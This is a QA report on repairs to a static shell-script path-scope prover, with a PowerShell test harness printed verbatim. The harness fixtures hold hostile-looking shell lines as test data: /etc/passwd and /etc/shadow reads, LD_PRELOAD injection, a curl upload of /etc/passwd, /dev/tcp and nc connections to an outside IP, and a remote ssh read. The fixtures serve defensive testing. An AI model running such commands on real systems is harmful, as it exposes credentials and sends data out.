# Self-QA — Stage-1 path-scope prover, repair round 2

> **⚠ ROUND-5 AMENDMENT (2026-08-14) — C-3, C-4 and the literal-harness
> portability defect; every transcript, count and digest in this file has been
> REGENERATED at round 5 and is current.** The final owner-authorized Codex T1
> execution audit of the committed round-4 candidate
> `2fb3eac05f8da716609549179a7961aa692eae6b`
> (`PATHSCOPE_CAP_OVERRIDE_CODEX_T1_AUDIT_2026-08-13.md`, verdict
> REQUEST_CHANGES) recorded three required findings. **C-3:** the assignment
> member grammar still had adjacent silent sinks — a whitespace list with a
> later relative member, a URI-shaped loader list with a later absolute member,
> a colon-bearing whole pathname reading, an empty-only loader list
> (`LD_LIBRARY_PATH=:`), and executable command text without `/`
> (`GIT_SSH_COMMAND="ssh -v"`) — each returning `PASS rc=0` with zero terminal
> accounting. **C-4:** the declaration builtins gated every operand on a RAW
> `ASSIGN_RE` match, so `export "LD_PRELOAD=/etc/escape.so"` and
> `export 'X=/safe dir/escape'` never reached the repaired grammar that the
> identical `env` shape did reach. **Portability:** the published harness did
> not reproduce its recorded transcripts and determinism digests under its own
> literal command, because it never pinned the child interpreter's stdout
> encoding and carried an absolute user-profile path through every transcript.
> Round 5 closes all three: `record_assignment_members` conserves the whole
> value *and* every member, `split_list_members` protects only a URI's
> scheme-and-authority span, an empty list member is resolved to the pinned PWD
> instead of vanishing, `analyze_declaration` classifies every operand on its
> expanded form so the prefix, `env` and declaration sites are one grammar, and
> the harness pins its encodings, drives the prover from the fixture directory
> with relative arguments so no user path can enter a transcript at all, and
> aborts if one does anyway. **The round-4 amendment below is retained for
> history; the fences in this file are the round-5 run.**
>
> **⚠ ROUND-4 AMENDMENT (2026-08-13) — C-2 repair; every transcript, count and
> digest in this file has been REGENERATED at round 4 and is current.** The Codex
> T1 execution re-audit of the round-3 bytes
> (`PATHSCOPE_CODEX_T1_EXEC_AUDIT_R3_2026-08-13.md`, verdict REQUEST_CHANGES)
> found CRITICAL **C-2**: `record_assignment_value` recorded a value only when
> the complete rendered value started with `/`, `./` or `../`, and then recorded
> it only as one whole blob — so a loader list with a later absolute member, a
> bare first member, a whitespace word list, an ordinary relative pathname, an
> empty list member, command text carrying an option path, and a URI-shaped
> value all returned `PASS rc=0` with the out-of-allowlist lexeme absent. The
> Lead additionally reproduced a false PASS in an incomplete first repair
> attempt, where a naive `str.split()` of the rendered value turned the single
> quoted pathname `/safe dir/escape` into two allowed paths. Round 4 replaces
> the first-character test with a member grammar (`record_assignment_members`)
> and adds the eighteen-fixture P10 family plus a third prover column — the
> round-3 committed blob — so the RED side of every C-2 closure is the actual
> pre-repair bytes, not a prediction. Round 4 also clears the three documentary
> nits from §5 of that audit. **The stale round-2 transcript warning below is
> retained for history; it no longer applies — the fences in this file are the
> round-4 run.**
>
> **⚠ ROUND-3 AMENDMENT (2026-08-13) — C-1 repair; all transcripts/counts/digests
> below were ROUND-2 and STALE at the time this was written.** The flagship execution audit
> (`PATHSCOPE_CLAUDE_T1_EXEC_AUDIT_2026-08-12.md`, verdict REQUEST_CHANGES) found
> CRITICAL **C-1**: assignment prefixes and declaration-builtin assignments
> (`LD_PRELOAD=/etc/evil.so cat …`, `export LD_PRELOAD=…`, `env LD_PRELOAD=… …`)
> were silently dropped — the out-of-allowlist path was invisible and the verdict
> was `PASS rc=0`. The round-3 source fix adds `record_assignment_value` and
> calls it at the three holes; seven P9 fixtures + CASES + a determinism pair
> were added to the harness below. **EXECUTED 2026-08-13 ~00:30 by the Lead:** the
> complete harness (including the seven P9 fixtures and the `assign_prefix`
> determinism pair) ran from the repository root, rc 0, stderr 0 bytes. All seven
> P9 predictions were confirmed by measurement — five silent sinks show
> RED `PASS rc=0` → GREEN `rc=1` with the out-of-allowlist path visible, both
> controls stay rc 0 with no false positive. The round-3 stdout below replaces the
> round-2 stdout (the harness changed, so the round-2 line counts 511/644 no
> longer reproduce; the counts *at round 3* were 552/1189). The prediction table in
> §"Round 3 — C-1 repair" is retained with its executed confirmation.
> *(Round-4 note: the harness changed again, so the current counts are 660/1363/150 —
> see the round-4 stdout fence, which is the authoritative one.)*

Date: 2026-08-11 (rounds 1–2) · 2026-08-13 (rounds 3–4) · 2026-08-14 (round 5)
Audit tier: T1 (local-only static analysis)
Working directory: `C:\LAB\Tradingview_LAB_CLEAN`
Implementer: rounds 2, 4 and 5 `claude-opus-5` (round 2 effort xhigh, rounds 4 and 5
effort high); round 3 GLM-5.2. No implementer is the auditor of record, so the round-5 T1
execution re-audit must be a fresh independent session of a flagship that is **not**
`claude-opus-5` and **not** GLM-5.2. Round 5 is the single repair authorized by
`WPI_OWNER_DECISION_PATHSCOPE_FINAL_OVERRIDE_2026-08-14.md`; no further repair or audit
cycle is authorized after the one `gpt-5.6-sol` high execution audit that follows it.

Every run below used CPython 3.14.2 with `-B`; the repaired source also parses with
`ast.parse(..., feature_version=(3, 12))`, re-verified at round 5 on the round-5 bytes. A
Python 3.12 executable is not installed on this workstation — `py -3.12 -V` reports no such
runtime. No shell fixture was executed, no host was contacted, and no network call was
made. Fixture files are written only under the Windows temporary directory; the mutation
copies are written only under `C:\tmp\ps_final_r5`.

## Identities

| artefact | bytes | SHA-256 | git blob |
|---|---|---|---|
| `pathscope_prover.py` round 1 (the audited bytes) | 49820 | `3D6AF544F5CBADB0A1432D4784848F68F4BFDDF22AA52C9369FD9729853D43E6` | `3f0820a9a6412f769b59b23a41df3bc6808bf6dc` |
| `pathscope_prover.py` round 2 | 122446 | `890016F0B9A8CDE4EED33F8733F69055471B07C6096F6BC07450457E6C52AF1D` | historical (r2 audit anchor) |
| `pathscope_prover.py` round 3 (the C-2 pre-repair subject, RED column of family P10) | 124251 | `0724967E919C6576A5A18EA5606B947F3A617A6601AEE89C486C4A6E6C8225F7` | `e600a107f2e2a790653cc544a94cd7436b7b070a` |
| `pathscope_prover.py` round 4 (the C-3/C-4 pre-repair subject, RED column of family P11) | 131599 | `553A97E932A190B4967B8F1F39C546D7558D9066ABD30B3AECA1913FED27E2EB` | `55ea3a852f7781d03d57483f554c1b8ac62007c6` |
| `pathscope_prover.py` round 5 (this repair) | 137520 | `28848D60F74A7C668DB3019BBAC58550F4A55C1C02038C013153316C711EDF9C` | uncommitted |
| `WPI_BLOCKS_DRAFT/RP6-P0.sh` | 107252 | `A090AE736CBECD9973E8AE948B052504B21CBE8B61602F4B5AC592394FAD0617` | `3c7b7d26a763f3904ea4fa4c0be3d39dc598c64c` |
| `WPI_BLOCKS_DRAFT/RP7-WPI-RO.sh` | 99903 | `11621044D0ADC21AF93E1CFC7B88EF88DE8ACA4683A69AB16CBC542A124141A4` | `5c9a2f597cceaef80d1cbd0fc100732f4b216cf5` |

The round-4 blob is the exact committed candidate the final Codex T1 audit froze and
rejected: `git rev-parse 2fb3eac05f8da716609549179a7961aa692eae6b:MTC_COMMAND_CENTER/11_TRIAGE/WPI_PREREG_DRAFT_ROUND1/pathscope_prover.py`
prints `55ea3a852f7781d03d57483f554c1b8ac62007c6`. The round-1, round-3 and round-4
artefacts are all reconstructed **from their pinned blobs**, not from the working tree, so
every RED column stays reproducible after the repair is committed. The two real blocks are
likewise read from their pinned blobs.

## How to reproduce every RED and every GREEN in one command

Save the fenced block below as `%TEMP%\pathscope_r5_harness.ps1`, then from
`C:\LAB\Tradingview_LAB_CLEAN`:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:TEMP\pathscope_r5_harness.ps1"
```

It writes every fixture, reconstructs the round-1, round-3 and round-4 provers from their
pinned blobs, extracts both real blocks from their pinned blobs, runs the complete case
list against the round-1 prover and the repaired prover, runs family P10 additionally
against the round-3 blob and families P10+P11 against the round-4 blob, writes
`RED_R1.txt`, `GREEN_R5.txt`, `RED_R3.txt` and `RED_R4.txt` next to the fixtures, and
finishes with the determinism check. Nothing in it depends on shell state established
elsewhere, and it contains no placeholder that must be edited before it runs. Its own
stdout was:

```text
R1_BASELINE bytes=49820 sha256=3D6AF544F5CBADB0A1432D4784848F68F4BFDDF22AA52C9369FD9729853D43E6
R3_PREREPAIR bytes=124251 sha256=0724967E919C6576A5A18EA5606B947F3A617A6601AEE89C486C4A6E6C8225F7
R4_PREREPAIR bytes=131599 sha256=553A97E932A190B4967B8F1F39C546D7558D9066ABD30B3AECA1913FED27E2EB
R5_REPAIRED bytes=137520 sha256=28848D60F74A7C668DB3019BBAC58550F4A55C1C02038C013153316C711EDF9C
BLOCK RP6-P0.sh bytes=107252 sha256=A090AE736CBECD9973E8AE948B052504B21CBE8B61602F4B5AC592394FAD0617 git_blob=3c7b7d26a763f3904ea4fa4c0be3d39dc598c64c
BLOCK RP7-WPI-RO.sh bytes=99903 sha256=11621044D0ADC21AF93E1CFC7B88EF88DE8ACA4683A69AB16CBC542A124141A4 git_blob=5c9a2f597cceaef80d1cbd0fc100732f4b216cf5
WROTE RED_R1.txt lines=768 sha256=667BF364D0008B3A5869C3ECC2CA16FDAC0C1D60086B3F8FB50CC3E93E70E89D
WROTE GREEN_R5.txt lines=1557 sha256=A534BDCFBBD7B21D874602EB5E90336CBF0796881BE650C3EEC973AF4DBE328C
WROTE RED_R3.txt lines=150 sha256=599B4482C91FCC22F5CA9BCE09261F193F25A4321BF53F650EAA31EEE8C4CBCC
WROTE RED_R4.txt lines=324 sha256=BC142778035AE9B759A47869CCEA86D8C23D9406735BBDB189009188C36CC01B
DETERMINISM find_exec rc1=1 rc2=1 equal=True sha1=f0f0bf2d14d9b504daa6528f230bc1bd4186dc8e9bcc5fd65d8d59b4016f11bd sha2=f0f0bf2d14d9b504daa6528f230bc1bd4186dc8e9bcc5fd65d8d59b4016f11bd
DETERMINISM assign_prefix rc1=1 rc2=1 equal=True sha1=dc1ab295175cb8cf28c9a0bfae247c2311957244714d1108a9e4b13297449ae1 sha2=dc1ab295175cb8cf28c9a0bfae247c2311957244714d1108a9e4b13297449ae1
DETERMINISM c2_list_prefix rc1=1 rc2=1 equal=True sha1=eed53413c5b972bae048263a7304aaeb5b6039f4abc5033d13b54b94596e53bd sha2=eed53413c5b972bae048263a7304aaeb5b6039f4abc5033d13b54b94596e53bd
DETERMINISM c3_ws_relative rc1=3 rc2=3 equal=True sha1=7c905b083423f11b616c6979c5d87b93aaa76b71f16325ea082a495971f38d6c sha2=7c905b083423f11b616c6979c5d87b93aaa76b71f16325ea082a495971f38d6c
DETERMINISM c4_export_quoted rc1=1 rc2=1 equal=True sha1=fa1ff7ce5b208da50c1dc11be72119ec0b906aec22afe15f7e2b124d32230581 sha2=fa1ff7ce5b208da50c1dc11be72119ec0b906aec22afe15f7e2b124d32230581
DETERMINISM RP6-P0 rc1=3 rc2=3 equal=True sha1=01bffdd3692a39ad2bdd025952b2dcba9d793162c2e83e8d83f92ed697ddfdc0 sha2=01bffdd3692a39ad2bdd025952b2dcba9d793162c2e83e8d83f92ed697ddfdc0
DETERMINISM RP7-WPI-RO rc1=3 rc2=3 equal=True sha1=2d87cffcc9f7fee241b5944fa8db62d5d6f652ea4b6af00760540f8e93c7c10a sha2=2d87cffcc9f7fee241b5944fa8db62d5d6f652ea4b6af00760540f8e93c7c10a
```

### Why this stdout is now a property of the harness and not of the machine

The round-4 harness recorded five determinism digests that a fresh auditor could not
reproduce. The cause was measured this round, not inferred:

* the harness never pinned the child interpreter's stdout encoding, so `python` fell back
  to the locale encoding (`cp1254` on a Turkish Windows profile) whenever the ambient
  `PYTHONIOENCODING` was not already set — and it *was* set in the implementer's session,
  which is why the round-4 run looked clean;
* PowerShell decoded that stream with `[Console]::OutputEncoding` (UTF-8 under code page
  65001), so the `ı` in the user profile name came back as U+FFFD while `$QA` — a .NET
  string — still held the real character, and `.Replace($QA, '<QA>')` therefore replaced
  nothing;
* the absolute user path then survived into every transcript and into the harness's own
  `WROTE …` lines, so the recorded SHA-256 digests could not reproduce.

Re-running the exact round-4 command against the round-4 bytes with the ambient
`PYTHONIOENCODING` removed reproduces the auditor's observed digests exactly, all five of
them:

```text
R4_UNDER_STRIPPED_ENV find_exec rc=1 sha=b3119f99152c865da799f5ac638327d32458fc9f02e6c73e07e7c496320d5620
R4_UNDER_STRIPPED_ENV assign_prefix rc=1 sha=f77f67147f87fdcdc2f5b8891e7e3c4a062c0da7c0197c568ab4264e1cb04d81
R4_UNDER_STRIPPED_ENV c2_list_prefix rc=1 sha=b2f153c2c0ade040cc39c8d0df1c7a7956be5a076c1842c325bd132d57e4f611
R4_UNDER_STRIPPED_ENV RP6-P0 rc=3 sha=8ce5571bd2e4f8f24135c860324e6c67bd84358fc77a095a1b53d768abe61ecf
R4_UNDER_STRIPPED_ENV RP7-WPI-RO rc=3 sha=c0e4b8073e7c387bf17e80435ddcfbd3d5ddf7d1b1db956cdbb1812c468bf452
```

against the round-4 recorded `11c5cb8e…67dd`, `32da2842…317a`, `40e458dc…8bf62`,
`2e9d6f44…05db`, `224cda72…2ad2`. The first line is the auditor's `b3119f99…5620`
character for character, and so are the other four.

The round-5 harness is not "two broken runs agreeing". It was run twice under two
deliberately different environments — once with `PYTHONIOENCODING=utf-8` and code page
65001 present, once with `PYTHONIOENCODING` and `PYTHONUTF8` **removed** and both the
console code page and `[Console]::OutputEncoding` forced to `windows-1254` — and produced
byte-identical stdout, byte-identical transcript digests
(`667BF364…E89D`, `A534BDCF…328C`, `599B4482…CBCC`, `BC142778…C01B`) and byte-identical
determinism digests. Three independent defences make that true, and none of them is a
substitution the reader has to perform:

1. the harness pins `PYTHONUTF8`, `PYTHONIOENCODING` and `[Console]::OutputEncoding`;
2. it runs the prover from the fixture directory with **relative** arguments, so no
   user-specific absolute path can enter a transcript and no `<QA>` normalisation exists
   to fail — the transcripts are pure ASCII;
3. it fails closed: if any transcript line contains the scratch directory, the temporary
   root or the repository root, the run aborts with `TRANSCRIPT_LEAK` instead of writing a
   transcript that cannot be re-derived.

Blob extraction and the `git hash-object` check no longer route a non-ASCII path through
`cmd /c` or through native-command argument encoding: the blob is streamed to disk through
.NET and the blob id is computed in process.

### The harness, verbatim

```powershell
$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# Run from the repository root C:\LAB\Tradingview_LAB_CLEAN.
#
# Round-5 portability repair.  The round-4 harness recorded digests that were a
# property of the environment that happened to run it, not of the harness:
#   * it never pinned the child interpreter's stdout encoding, so `python` used
#     the locale encoding (cp1254 on a Turkish Windows profile) unless the
#     ambient PYTHONIOENCODING happened to be set;
#   * PowerShell decoded that stream with [Console]::OutputEncoding (UTF-8 under
#     chcp 65001), so a user profile containing a non-ASCII character came back
#     mangled while $QA - a .NET string - kept the real character, and the
#     `.Replace($QA, '<QA>')` normalisation therefore replaced nothing;
#   * the transcripts and the harness's own stdout carried that absolute user
#     path, so the recorded SHA-256 digests could not reproduce.
# Three independent defences are applied and none of them is a substitution the
# reader has to perform: the child encoding is pinned, every prover argument is
# relative so no user path can enter a transcript at all, and a fail-closed
# assertion aborts the run if a scratch path leaks into any transcript anyway.

$env:PYTHONUTF8 = '1'
$env:PYTHONIOENCODING = 'utf-8'
[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false)

$REPO = (Get-Location).Path
$TOOL = (Resolve-Path 'MTC_COMMAND_CENTER\11_TRIAGE\WPI_PREREG_DRAFT_ROUND1\pathscope_prover.py').Path
$TEMPROOT = [System.IO.Path]::GetTempPath()
$QA   = Join-Path $TEMPROOT 'pathscope-repair-r5'
New-Item -ItemType Directory -Path $QA -Force | Out-Null

function New-Fixture([string]$Name, [string[]]$Lines) {
  [System.IO.File]::WriteAllText((Join-Path $QA $Name), (($Lines -join "`n") + "`n"))
}

# Byte-exact blob extraction with no shell in the path: `cmd /c "... > path"`
# re-encodes the destination path through the console code page, which is the
# same class of defect this round is closing.
function Save-Blob([string]$Sha, [string]$Name) {
  $psi = New-Object System.Diagnostics.ProcessStartInfo
  $psi.FileName = 'git'
  $psi.Arguments = "cat-file blob $Sha"
  $psi.WorkingDirectory = $REPO
  $psi.UseShellExecute = $false
  $psi.RedirectStandardOutput = $true
  $proc = [System.Diagnostics.Process]::Start($psi)
  $fs = [System.IO.File]::Create((Join-Path $QA $Name))
  $proc.StandardOutput.BaseStream.CopyTo($fs)
  $fs.Close()
  $proc.WaitForExit()
  if ($proc.ExitCode -ne 0) { throw "git cat-file blob $Sha failed rc=$($proc.ExitCode)" }
}

# git's own blob identity, computed in process, so the check does not depend on
# how the shell encodes a file name argument.
function Get-BlobId([string]$Name) {
  $bytes = [System.IO.File]::ReadAllBytes((Join-Path $QA $Name))
  $header = [Text.Encoding]::ASCII.GetBytes("blob $($bytes.Length)`0")
  $buf = New-Object byte[] ($header.Length + $bytes.Length)
  [Array]::Copy($header, 0, $buf, 0, $header.Length)
  [Array]::Copy($bytes, 0, $buf, $header.Length, $bytes.Length)
  $sha1 = [System.Security.Cryptography.SHA1]::Create()
  return (($sha1.ComputeHash($buf) | ForEach-Object { $_.ToString('x2') }) -join '')
}

function Get-Sha256([string]$Name) {
  return (Get-FileHash -Algorithm SHA256 -LiteralPath (Join-Path $QA $Name)).Hash
}
function Get-Size([string]$Name) {
  return (Get-Item -LiteralPath (Join-Path $QA $Name)).Length
}

# --- the round-1 artefact under audit, reconstructed from its pinned blob ---
Save-Blob '3f0820a9a6412f769b59b23a41df3bc6808bf6dc' 'pathscope_prover_R1.py'
"R1_BASELINE bytes=$(Get-Size 'pathscope_prover_R1.py') sha256=$(Get-Sha256 'pathscope_prover_R1.py')"
# --- the round-3 artefact, the pre-repair subject of the C-2 finding ---
Save-Blob 'e600a107f2e2a790653cc544a94cd7436b7b070a' 'pathscope_prover_R3.py'
"R3_PREREPAIR bytes=$(Get-Size 'pathscope_prover_R3.py') sha256=$(Get-Sha256 'pathscope_prover_R3.py')"
# --- the round-4 artefact, the committed pre-repair subject of C-3 and C-4 ---
Save-Blob '55ea3a852f7781d03d57483f554c1b8ac62007c6' 'pathscope_prover_R4.py'
"R4_PREREPAIR bytes=$(Get-Size 'pathscope_prover_R4.py') sha256=$(Get-Sha256 'pathscope_prover_R4.py')"
$h5 = (Get-FileHash -Algorithm SHA256 -LiteralPath $TOOL).Hash
$l5 = (Get-Item -LiteralPath $TOOL).Length
"R5_REPAIRED bytes=$l5 sha256=$h5"

# --- the round-1 audit's own constants and allowlist, unchanged ---
New-Fixture 'constants.env' @(
  'ROOT=/safe',
  'PWD=/safe',
  'URL=http://127.0.0.1:8790/api/status',
  'HOST=198.51.100.10')
New-Fixture 'allowlist.txt' @('/safe/**', '127.0.0.1:8790')
New-Fixture 'constants_home.env' @('ROOT=/safe', 'PWD=/safe', 'HOME=/home/gatea')
New-Fixture 'allowlist_terminal.txt' @('terminal:/safe/conf')
# PWD pinned outside the allowlist, so an ordinary relative pathname in an
# assignment value resolves to a forbidden absolute path (C-2 relative case).
New-Fixture 'constants_pwd_outside.env' @(
  'ROOT=/safe',
  'PWD=/elsewhere',
  'URL=http://127.0.0.1:8790/api/status',
  'HOST=198.51.100.10')
# A relative constant plus exact allowlist rules, for the C-3 colon-bearing
# single-pathname reading.
New-Fixture 'constants_base.env' @('ROOT=/safe', 'PWD=/safe', 'BASE=dir/file')
New-Fixture 'allowlist_base.txt' @('<BASE>', '<ROOT>/f')

# --- kickoff deliverable 2 of round 1: the original GREEN/RED set ---
New-Fixture 'green.sh'          @('#!/bin/bash', 'leaf="$ROOT/input"', 'cat "$leaf"')
New-Fixture 'literal.sh'        @('#!/bin/bash', 'cat /etc/passwd')
New-Fixture 'assembled.sh'      @('#!/bin/bash', 'p="/etc"', 'q="mtc-bridge"', 'cat "$p/$q/x"')
New-Fixture 'dynamic.sh'        @('#!/bin/bash', 'p="$(printf /safe)"', 'cat "$p/x"')
New-Fixture 'nested.sh'         @('#!/bin/bash', 'unused="$(cat /etc/shadow)"')

# --- CRITICAL findings 1-4: silent sink loss ---
New-Fixture 'pushd.sh'          @('#!/bin/bash', 'pushd "$ROOT"')
New-Fixture 'pushd_forbidden.sh' @('#!/bin/bash', 'pushd /etc')
New-Fixture 'popd_stack.sh'     @('#!/bin/bash', 'popd +1')
New-Fixture 'trap.sh'           @('#!/bin/bash', 'trap ''cat /etc/passwd'' EXIT')
New-Fixture 'ssh.sh'            @('#!/bin/bash', 'ssh "$HOST"')
New-Fixture 'ssh_command.sh'    @('#!/bin/bash', 'ssh -p 2222 "$HOST" ''cat /etc/passwd''')
New-Fixture 'getent.sh'         @('#!/bin/bash', 'getent hosts "$HOST"')
New-Fixture 'find_exec.sh'      @('#!/bin/bash', 'find "$ROOT" -exec cat /etc/passwd \;')
New-Fixture 'find_unknown.sh'   @('#!/bin/bash', 'find "$ROOT" -pathscope-unmodeled')
New-Fixture 'curl_upload.sh'    @('#!/bin/bash', 'curl --upload-file=/etc/passwd "$URL"')
New-Fixture 'curl_net.sh'       @('#!/bin/bash', 'curl "$URL"')
New-Fixture 'tar_option.sh'     @('#!/bin/bash', 'tar --create --file=/etc/pathscope-evil.tar "$ROOT"')
New-Fixture 'cp_option.sh'      @('#!/bin/bash', 'cp --target-directory=/etc "$ROOT/input"')
New-Fixture 'cp_unknown.sh'     @('#!/bin/bash', 'cp --pathscope-unmodeled=1 "$ROOT/a" "$ROOT/b"')

# --- same class as 1-4, found during repair ---
New-Fixture 'python_c.sh'       @('#!/bin/bash', 'python3 -c ''open("/etc/passwd")''')
New-Fixture 'alias.sh'          @('#!/bin/bash', 'alias ll=''cat /etc/passwd''')
New-Fixture 'hash_p.sh'         @('#!/bin/bash', 'hash -p /etc/passwd ff')
New-Fixture 'mapfile_cb.sh'     @('#!/bin/bash', 'mapfile -C ''cat /etc/passwd'' -c 1 arr')
New-Fixture 'systemctl_link.sh' @('#!/bin/bash', 'systemctl link /etc/systemd/system/evil.service')
New-Fixture 'jobs_x.sh'         @('#!/bin/bash', 'jobs -x cat /etc/passwd')

# --- HIGH findings 5-7 ---
New-Fixture 'tilde.sh'          @('#!/bin/bash', 'cat ~/secret')
New-Fixture 'tilde_user.sh'     @('#!/bin/bash', 'cat ~gatea/secret')
New-Fixture 'tilde_home.sh'     @('#!/bin/bash', 'cat ~/secret')
New-Fixture 'symlink_lexical.sh' @('#!/bin/bash', 'cat "$ROOT/link/passwd"')
New-Fixture 'redir_rw.sh'       @('#!/bin/bash', 'read x <> /etc/x')

# --- remaining redirection grammar ---
New-Fixture 'redir_clobber.sh'  @('#!/bin/bash', 'echo x >| /etc/y')
New-Fixture 'redir_amp.sh'      @('#!/bin/bash', 'ls &> /etc/z')
New-Fixture 'fddup.sh'          @('#!/bin/bash', 'exec 3>&2', 'echo hi >&2', 'exec 3>&-')
New-Fixture 'exec_redir.sh'     @('#!/bin/bash', 'exec 3> "$ROOT/out"')
New-Fixture 'devtcp.sh'         @('#!/bin/bash', 'cat < /dev/tcp/198.51.100.10/8790')
New-Fixture 'devtcp_allow.sh'   @('#!/bin/bash', 'cat < /dev/tcp/127.0.0.1/8790')

# --- expansions and quoting ---
New-Fixture 'heredoc.sh'        @('#!/bin/bash', 'cat <<EOF', '/etc/passwd', 'EOF')
New-Fixture 'heredoc_subst.sh'  @('#!/bin/bash', 'cat <<EOF', '$(cat /etc/shadow)', 'EOF')
New-Fixture 'heredoc_quoted.sh' @('#!/bin/bash', 'cat <<''EOF''', '$(cat /etc/shadow)', 'EOF')
New-Fixture 'herestring.sh'     @('#!/bin/bash', 'cat <<< "$ROOT"')
New-Fixture 'array.sh'          @('#!/bin/bash', 'A=(/etc/passwd)', 'cat "${A[0]}"')
New-Fixture 'brace.sh'          @('#!/bin/bash', 'cat /safe/{a,b}')
New-Fixture 'arith.sh'          @('#!/bin/bash', 'cat "/safe/$((1+1))"')
New-Fixture 'param_default.sh'  @('#!/bin/bash', 'cat "${MISSING:-/etc/passwd}"')
New-Fixture 'param_subst.sh'    @('#!/bin/bash', 'cat "${ROOT/x/y}"')
New-Fixture 'ansic.sh'          @('#!/bin/bash', 'cat $''/etc/passwd''')
New-Fixture 'continuation.sh'   @('#!/bin/bash', 'cat \', '"$ROOT/input"')
New-Fixture 'backtick.sh'       @('#!/bin/bash', 'unused="`cat /etc/shadow`"')
New-Fixture 'glob.sh'           @('#!/bin/bash', 'cat "$ROOT"/*')

# --- argv shapes ---
New-Fixture 'source.sh'         @('#!/bin/bash', 'source "$ROOT/lib.sh"')
New-Fixture 'dot_source.sh'     @('#!/bin/bash', '. "$ROOT/lib.sh"')
New-Fixture 'xargs.sh'          @('#!/bin/bash', 'xargs -a "$ROOT/list" cat')
New-Fixture 'multipath.sh'      @('#!/bin/bash', 'install -m 0644 "$ROOT/a" /etc/b')
New-Fixture 'scp_remote.sh'     @('#!/bin/bash', 'scp "$ROOT/a" gatea@198.51.100.10:/tmp/b')
New-Fixture 'nc_client.sh'      @('#!/bin/bash', 'nc "$HOST" 8790')
New-Fixture 'grep_files.sh'     @('#!/bin/bash', 'grep -q needle "$ROOT/f"')
New-Fixture 'sed_prog.sh'       @('#!/bin/bash', 'sed -n ''s/a/b/p'' "$ROOT/f"')
New-Fixture 'func_positional.sh' @('#!/bin/bash', 'f() { cat "$1"; }', 'f /etc/passwd')
New-Fixture 'func_body.sh'      @('#!/bin/bash', 'g() { cat "$ROOT/ok"; }', 'g')
New-Fixture 'case_loop.sh'      @('#!/bin/bash', 'for n in a b; do', '  case "$n" in', '    a) cat "$ROOT/a" ;;', '    *) cat /etc/other ;;', '  esac', 'done')
New-Fixture 'terminal_stat.sh'  @('#!/bin/bash', 'stat /safe/conf')
New-Fixture 'terminal_cat.sh'   @('#!/bin/bash', 'cat /safe/conf')

# --- C-1 repair (round 3): assignment-prefix silent sink, adversarial family P9 ---
# These exercise the three holes that shared one defect class: the assignment
# prefix loop, the declaration builtins, and the env wrapper. Every fixture is a
# local symbolic body; none is executed as shell.
New-Fixture 'assign_prefix.sh'       @('#!/bin/bash', 'LD_PRELOAD=/etc/evil.so cat "$ROOT/f"')
New-Fixture 'assign_prefix_allow.sh' @('#!/bin/bash', 'LD_PRELOAD="$ROOT/ok.so" cat "$ROOT/f"')
New-Fixture 'assign_bare.sh'         @('#!/bin/bash', 'X=/etc/passwd')
New-Fixture 'assign_benign.sh'       @('#!/bin/bash', 'IFS=: cat "$ROOT/f"')
New-Fixture 'assign_export.sh'       @('#!/bin/bash', 'export LD_PRELOAD=/etc/evil.so', 'cat "$ROOT/f"')
New-Fixture 'assign_env.sh'          @('#!/bin/bash', 'env LD_PRELOAD=/etc/evil.so cat "$ROOT/f"')
New-Fixture 'assign_multi.sh'        @('#!/bin/bash', 'LD_PRELOAD=/etc/a.so BASH_ENV=/etc/b.sh cat "$ROOT/f"')

# --- C-2 repair (round 4): assignment-value MEMBER grammar, family P10 ---
# Round 3 recorded an assignment value only when the complete rendered value
# started with '/', './' or '../', and recorded that value only as one blob.
# These fixtures cover the three sites (prefix, env, export) across every member
# shape the round-3 predicate lost or mis-read: a later absolute member of a
# colon list, a bare first member, a whitespace word list, an ordinary relative
# pathname, an empty list member, a quoted pathname containing a blank, an
# escaped blank followed by a later member, command text carrying an option
# path, a URI-shaped value, and the benign controls that must stay rc 0.
New-Fixture 'c2_list_prefix.sh'      @('#!/bin/bash', 'LD_LIBRARY_PATH=$ROOT/lib:/etc/escape cat "$ROOT/f"')
New-Fixture 'c2_list_env.sh'         @('#!/bin/bash', 'env LD_LIBRARY_PATH=$ROOT/lib:/etc/escape cat "$ROOT/f"')
New-Fixture 'c2_list_export.sh'      @('#!/bin/bash', 'export LD_LIBRARY_PATH=$ROOT/lib:/etc/escape', 'cat "$ROOT/f"')
New-Fixture 'c2_list_bare_first.sh'  @('#!/bin/bash', 'LD_PRELOAD=bare.so:/etc/escape.so cat "$ROOT/f"')
New-Fixture 'c2_list_space.sh'       @('#!/bin/bash', 'LD_PRELOAD="bare.so /etc/escape.so" cat "$ROOT/f"')
New-Fixture 'c2_relative.sh'         @('#!/bin/bash', 'LD_PRELOAD=relative/path.so cat "$ROOT/f"')
New-Fixture 'c2_empty_member.sh'     @('#!/bin/bash', 'LD_LIBRARY_PATH=:/etc/escape cat "$ROOT/f"')
New-Fixture 'c2_quoted_space.sh'     @('#!/bin/bash', 'X="$ROOT dir/escape" cat "$ROOT/f"')
New-Fixture 'c2_escaped_space.sh'    @('#!/bin/bash', 'X=$ROOT/a\ b:/etc/escape cat "$ROOT/f"')
New-Fixture 'c2_command_text.sh'     @('#!/bin/bash', 'GIT_SSH_COMMAND="ssh -i /etc/key" cat "$ROOT/f"')
New-Fixture 'c2_uri_forbid.sh'       @('#!/bin/bash', 'WEBHOOK=http://198.51.100.10:9999/x cat "$ROOT/f"')
New-Fixture 'c2_uri_allow.sh'        @('#!/bin/bash', 'WEBHOOK="$URL" cat "$ROOT/f"')
New-Fixture 'c2_env_quoted.sh'       @('#!/bin/bash', 'env "LD_PRELOAD=/etc/evil.so" cat "$ROOT/f"')
New-Fixture 'c2_bare_soname.sh'      @('#!/bin/bash', 'LD_PRELOAD=libc.so cat "$ROOT/f"')
New-Fixture 'c2_allow_list.sh'       @('#!/bin/bash', 'LD_LIBRARY_PATH=$ROOT/lib:$ROOT/lib64 cat "$ROOT/f"')
New-Fixture 'c2_benign_scalars.sh'   @('#!/bin/bash', 'IFS=: LC_ALL=C count=1 cat "$ROOT/f"')
New-Fixture 'c2_benign_words.sh'     @('#!/bin/bash', 'MSG="Permission denied" cat "$ROOT/f"')
New-Fixture 'c2_words_with_path.sh'  @('#!/bin/bash', 'MSG="denied /etc/secret" cat "$ROOT/f"')

# --- C-3 and C-4 repair (round 5): member conservation and declaration
# reachability, adversarial family P11 ---
# C-3: every reading the round-4 member grammar admitted but left without a
# terminal disposition - a later relative word behind a path-shaped first word,
# a later word behind a path-shaped first word generally, a mixed URI/pathname
# list, a colon-bearing single pathname, an empty-only list, and executable
# command text carrying no '/' at all.
